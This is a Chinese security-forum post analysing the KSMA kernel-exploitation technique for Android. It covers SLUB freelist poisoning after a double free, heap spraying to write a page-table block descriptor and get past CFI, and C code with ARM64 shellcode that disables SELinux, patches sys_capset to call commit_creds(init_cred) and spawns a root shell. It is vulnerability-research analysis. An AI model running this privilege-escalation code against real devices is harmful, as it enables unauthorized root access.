
# 任意读写内核——KSMA

[KSMA](https://bbs.kanxue.com/elink@814K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6i4K6u0W2j5X3I4S2j5$3E0Z5j5i4c8Q4x3X3g2U0L8$3#2Q4x3V1k6T1M7X3W2W2k6X3W2F1k6%4y4Q4x3V1k6S2M7$3W2S2i4K6u0r3x3U0l9I4z5q4)9J5c8X3q4K6K9h3q4Q4x3X3b7I4z5q4)9J5k6q4N6m8e0V1N6Q4x3X3c8w2f1@1#2m8i4K6u0V1b7Y4u0W2j5h3E0A6L8X3N6Q4x3X3c8m8L8X3c8J5L8$3W2V1i4K6u0V1K9$3g2J5L8X3g2D9i4K6u0V1K9i4y4G2L8r3q4@1K9h3!0F1i4K6u0V1j5h3&6V1i4K6u0V1f1X3!0G2N6r3W2F1k6#2)9J5k6s2N6A6N6r3S2Q4x3X3c8m8f1V1#2Q4x3X3c8y4e0g2g2Q4x3X3c8X3k6h3q4@1N6i4u0W2M7#2)9J5k6i4m8V1k6R3`.`)简单的理解就是向内核页表中写入一项描述符，就可以做到用户态可以随意读写内核了，甚至代码段，拿到 root 岂不是轻而易举了。

引用一张图就是：

![引用5](https://bbs.kanxue.com/upload/attach/202012/726411_ZSPZ6KF4DVD2FB5.png)

这里就不细讲了，如果想理解的话，请参考以上 PDF。总之我们想让一个内核地址写入一个描述符，应该怎么利用呢。

## SLUB 机制

利用了内核的堆分配机制 [SLUB](https://bbs.kanxue.com/elink@8e3K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6b7j5h3!0D9L8@1#2G2L8Y4c8A6y4o6u0Q4x3V1k6K6j5h3I4@1i4K6u0r3j5X3I4G2j5W2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8X3c8G2j5%4y4Q4x3V1j5H3P5o6l9H3i4K6g2X3f1@1I4g2b7W2)9#2k6Y4u0W2k6Y4u0W2M7$3S2W2M7W2)9J5k6h3#2V1)`)，SLUB 中有一个字段叫做 `freelist` 指针，它指向最新被 `free` 的对象。

而第一个对象的首 8 个字节，会指向第二个被 `free` 的对象，以此类推。

当 `kmalloc` 分配时，将会从 `freelist` 指向的 object 取，并且读取这个 object 的前 8 个字节赋给新的 `freelist`。

当 `kfree` 时，SLUB 会写当前的 `freelist` 指针写入到正在被 `free` 的 object 首地址处，并且更新 `freelist` 指针指向这个新的被 `free` 掉的 object。

### `kfree` 时

![引用6](https://bbs.kanxue.com/upload/attach/202012/726411_M8JFZTE7GYTNQF9.png)

以上图可以看到 `kfree(0x1180)` 后，`freelist=0x1180`，`0x1180` 的前 8 个字节 `=0`。

`kfree(0x1100)` 后，`freelist=0x1100`，`0x1100` 位置处的前 8 个字节 `=0x1180`，以此类推。

### `kmalloc` 时

![引用7](https://bbs.kanxue.com/upload/attach/202012/726411_6V4FH9RJZ5DEF8S.png)

以上图可以看到 `kmalloc(0x1000)`，`freelist` 从 `0x1000` 变为 `0x1100`。

下一次分配，`kmalloc(0x1100)` 时，`freelist` 取出 `0x1100` 的前 8 个字节的地址变为 `0x1180`，所以从 `0x1100` 变为 `0x1180`。

通过此，利用就有了新思路：

1. 当 double free 发生时，再次申请两次会发生重叠。这时候第一次的被 free 掉，第二次用 `signalfd` 函数对喷，并且通过用户态修改前 8 个字节，就修改了第一次被 free 掉的 object 的指针，再几次分配时 `freelist` 指针就会从用户态指定的地址去分配了，前提是保证 free 掉的 object 必须还在对应的内核虚拟位置。

如果修改 slab 中的 `freelist` 位置的值，就会分配对象在我们想要的位置：

![引用8](https://bbs.kanxue.com/upload/attach/202012/726411_UC6ZM5TFGBE73B8.png)

当修改 `0x1100` 位置的前 8 个字节为 `0xDEADBEEF` 时，等分配到 `kmalloc(0x80)` 时，`freelist=0xDEADBEEF`，再次分配就会分配到 `0xDEADBEEF` 这个地址。

![引用9](https://bbs.kanxue.com/upload/attach/202012/726411_J7G5Q5PFX2AZG56.png)

通过修改 free 对象的 `freelist` 位置的地址，就可以达到任意地址写入任意值的效果。

如果最终想实现 `swapper_pg_dir=*B5F00 = 0x00e8000080000751` 这样的效果，就能够任意 patch 内核。

但 `signalfd` 的限制就是再写入首 8 个字节处位 8 和位 18 总是被置位，即写入的总是 `b5xxx | 40100 = f5xxx = 0x00e8000080000751`。

为了解决这个问题，作者在内核中找到了 `ipa_testbus_mem` 缓冲区，大小为 `0x198000`，并且缓冲区为 0。

2. 堆喷一次 `signalfd`，然后触发 free，通过 `write` 调用修改 `freelist` 为 `ipa_testbus_mem | 0x40100`，下一次分配的为地址 `ipa_testbus_mem | 0x40100`。

   再通过堆喷 `eventfd(0, EFD_NONBLOCK)` 和 `sendmsg` 结合，这样 `eventfd` 会 block 住 `sendmsg`，不让堆内容进行释放。

   从而 `eventfd_ctx` 结构体的地址 `=ipa_testbus_mem | 0x40100`，同时 `eventfd_ctx+0x20`（count 的字段）可以被用户态通过 `write` 来修改。

   就可以把 `B5F00` 地址写入 count 字段，就相当于写入到 `ipa_testbus_mem | 0x40100+0x20` 处。

3. 这时候 free 所有的 `eventfd`，并且重新利用 free 的 `signalfd` 设置 `freelist` 为 `ipa_testbus_mem | 0x40100 + 0x20`，等再次 `signalfd` 分配就会分配到 `B5F00` 地址，这样通过 `write` 调用写入最终的 block 描述符了 `0x00e8000080000751`，即绕过了 CFI。

# 后续 Root 部分

1. 关掉 SELinux。
2. patch 这个函数 `sys_capset` 来替换成 shellcode。
3. 以及将 init's credentials 替换到本进程中即可完成提权。

```c
1. 关掉 selinux。

uint64_t selinux_enforcing_addr = base + 0x80000 + SELINUX_ENFORCING;

debug_printf("Before: enforcing = %x\n", *(uint32_t *)selinux_enforcing_addr);

/* setting selinux_enforcing to 0 */
*(uint32_t *)selinux_enforcing_addr = 0;

debug_printf("After: enforcing = %x\n", *(uint32_t *)selinux_enforcing_addr);

2. get root.

#define LO_DWORD(addr) ((addr) & 0xffffffff)
#define HI_DWORD(addr) LO_DWORD((addr) >> 32)

/* Preparing addresses for the shellcode */
uint64_t sys_capset_addr = base + 0x80000 + SYS_CAPSET;
uint64_t init_cred_addr = kaslr_leak + INIT_CRED;
uint64_t commit_creds_addr = kaslr_leak + COMMIT_CREDS;

uint32_t shellcode[] = {
    /* commit_creds(init_cred) */
    0x58000040, /* ldr x0, .+8 */
    0x14000003, /* b   .+12 */
    LO_DWORD(init_cred_addr),
    HI_DWORD(init_cred_addr),
    0x58000041, /* ldr x1, .+8 */
    0x14000003, /* b   .+12 */
    LO_DWORD(commit_creds_addr),
    HI_DWORD(commit_creds_addr),
    0xA9BF7BFD, /* stp x29, x30, [sp, #-0x10]! */
    0xD63F0020, /* blr x1 */
    0xA8C17BFD, /* ldp x29, x30, [sp], #0x10 */
    0x2A1F03E0, /* mov w0, wzr */
    0xD65F03C0, /* ret */
};

/* Saving sys_capset current code */
uint8_t sys_capset[sizeof(shellcode)];
memcpy(sys_capset, sys_capset_addr, sizeof(sys_capset));

/* Patching sys_capset with our shellcode */
debug_print("Patching SyS_capset()\n");
memcpy(sys_capset_addr, shellcode, sizeof(shellcode));

/* Calling our patched version of sys_capset */
ret = capset(NULL, NULL);
debug_printf("capset returned %d", ret);
if (ret < 0) perror("capset failed");

/* Restoring sys_capset */
debug_print("Restoring SyS_capset()");
memcpy(sys_capset_addr, sys_capset, sizeof(sys_capset));

/* Starting a shell */
system("sh");

exit(0);
```

# 总结

本漏洞得多次利用 race condition 来实现每个重要的阶段，如控制 `w->type` 来进行 double free。由于 `w` 是堆喷的对象，通过堆喷一次，再次触发 free，形成 double free。

接下来进入利用阶段，堆喷 `sendmsg`、`signalfd`，然后走入 free 分支，再次堆喷 `seq_operations`，调用 read signal 来实现读取 `seq_start` 的地址，绕过内核随机化保护。

然后又利用 double free 触发漏洞，结合 KSMA 写入页表一个 block 描述符，修改 `freelist` 指针。由于 `signalfd` 的写入限制，所以加入了一个全局 buffer 作为跳板，再通过 `sendmsg` 和 `eventd` 的堆喷驻留，最后 `write` 写入其 count 字段，绕过 CFI 保护，后续的 root 部分就是常规操作了。

由于文章新出来没几天，也是自己对这篇文章的理解，欢迎讨论和指点。

# 参考

- [3a2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2L8r3!0F1k6%4c8W2M7X3#2Q4x3X3g2A6L8#2)9J5c8X3y4$3k6g2)9J5k6o6t1H3x3U0m8Q4x3V1j5K6x3g2)9J5c8X3y4$3k6g2)9J5k6o6t1H3x3U0m8Q4x3X3b7H3y4o6t1K6i4K6u0W2K9s2c8E0L8l9`](3a2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2L8r3!0F1k6%4c8W2M7X3#2Q4x3X3g2A6L8#2)9J5c8X3y4$3k6g2)9J5k6o6t1H3x3U0m8Q4x3V1j5K6x3g2)9J5c8X3y4$3k6g2)9J5k6o6t1H3x3U0m8Q4x3X3b7H3y4o6t1K6i4K6u0W2K9s2c8E0L8l9`.`)
- KSMA: Breaking Android kernel isolation and Rooting with ARM MMU features - ThomasKing
- [5d0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6i4K6u0W2j5X3I4S2j5$3E0Z5j5i4c8Q4x3X3g2U0L8$3#2Q4x3V1k6T1M7X3W2W2k6X3W2F1k6%4y4Q4x3V1k6S2M7$3W2S2i4K6u0r3x3U0l9I4z5q4)9J5c8X3q4K6K9h3q4Q4x3X3b7I4z5q4)9J5k6q4N6m8e0V1N6Q4x3X3c8w2f1@1#2m8i4K6u0V1b7Y4u0W2j5h3E0A6L8X3N6Q4x3X3c8m8L8X3c8J5L8$3W2V1i4K6u0V1K9$3g2J5L8X3g2D9i4K6u0V1K9i4y4G2L8r3q4@1K9h3!0F1i4K6u0V1j5h3&6V1i4K6u0V1f1X3!0G2N6r3W2F1k6#2)9J5k6s2N6A6N6r3S2Q4x3X3c8m8f1V1#2Q4x3X3c8y4e0g2g2Q4x3X3c8X3k6h3q4@1N6i4u0W2M7#2)9J5k6i4m8V1k6R3`.`](5d0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6i4K6u0W2j5X3I4S2j5$3E0Z5j5i4c8Q4x3X3g2U0L8$3#2Q4x3V1k6T1M7X3W2W2k6X3W2F1k6%4y4Q4x3V1k6S2M7$3W2S2i4K6u0r3x3U0l9I4z5q4)9J5c8X3q4K6K9h3q4Q4x3X3b7I4z5q4)9J5k6q4N6m8e0V1N6Q4x3X3c8w2f1@1#2m8i4K6u0V1b7Y4u0W2j5h3E0A6L8X3N6Q4x3X3c8m8L8X3c8J5L8$3W2V1i4K6u0V1K9$3g2J5L8X3g2D9i4K6u0V1K9i4y4G2L8r3q4@1K9h3!0F1i4K6u0V1j5h3&6V1i4K6u0V1f1X3!0G2N6r3W2F1k6#2)9J5k6s2N6A6N6r3S2Q4x3X3c8m8f1V1#2Q4x3X3c8y4e0g2g2Q4x3X3c8X3k6h3q4@1N6i4u0W2M7#2)9J5k6i4m8V1k6R3`.`)
- Mitigations are attack surface, too - Project Zero
- [3daK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4L8$3!0Y4L8r3g2H3M7X3!0B7k6h3y4@1P5X3g2J5L8#2)9J5k6h3u0D9L8$3N6K6M7r3!0@1i4K6u0W2j5$3!0E0i4K6u0r3x3U0l9J5x3q4)9J5c8U0l9J5i4K6u0r3L8h3W2@1K9h3N6S2N6r3W2G2L8Y4y4Q4x3X3c8S2M7X3g2Q4x3X3c8S2N6s2c8S2j5$3E0Q4x3X3c8K6N6i4u0X3j5h3y4W2i4K6u0V1N6r3!0G2i4K6u0W2K9s2c8E0L8l9`](3daK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4L8$3!0Y4L8r3g2H3M7X3!0B7k6h3y4@1P5X3g2J5L8#2)9J5k6h3u0D9L8$3N6K6M7r3!0@1i4K6u0W2j5$3!0E0i4K6u0r3x3U0l9J5x3q4)9J5c8U0l9J5i4K6u0r3L8h3W2@1K9h3N6S2N6r3W2G2L8Y4y4Q4x3X3c8S2M7X3g2Q4x3X3c8S2N6s2c8S2j5$3E0Q4x3X3c8K6N6i4u0X3j5h3y4W2i4K6u0V1N6r3!0G2i4K6u0W2K9s2c8E0L8l9`.`)
- [Exploiting CVE-2020-0041: Escaping the Chrome Sandbox - Blue Frost Security](#)
- Part 1: `c2dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6D9j5h3u0K6i4K6u0W2j5X3I4#2k6h3k6J5L8%4y4@1M7$3g2U0N6i4u0A6N6s2W2Q4x3X3g2V1k6g2)9J5c8X3u0D9L8$3N6Q4x3V1j5J5x3o6t1H3i4K6u0r3x3o6y4Q4x3V1j5K6x3g2)9J5c8X3y4$3k6g2)9J5k6o6t1H3x3U0m8Q4x3X3b7H3x3o6b7I4i4K6u0V1M7r3q4J5N6q4)9J5k6o6q4Q4x3X3c8K6j5h3&6V1j5X3!0^5i4K6u0V1k6i4y4U0j5i4m8W2i4K6u0r3`
- Part 2: `bd3K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6D9j5h3u0K6i4K6u0W2j5X3I4#2k6h3k6J5L8%4y4@1M7$3g2U0N6i4u0A6N6s2W2Q4x3X3g2V1k6g2)9J5c8X3u0D9L8$3N6Q4x3V1j5J5x3o6t1H3i4K6u0r3x3o6c8Q4x3V1j5H3z5q4)9J5c8X3y4$3k6g2)9J5k6o6t1H3x3U0m8Q4x3X3b7H3x3o6b7I4i4K6u0V1M7r3q4J5N6q4)9J5k6o6u0Q4x3X3c8W2M7$3y4S2L8r3q4@1K9h3&6Y4i4K6u0V1N6r3!0Q4x3X3c8J5L8$3!0@1i4K6u0r3`

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2022-10-3 00:33 被 LowRebSwrd 编辑。

原因：

[#漏洞相关](https://bbs.kanxue.com/forum-161-1-123.htm)
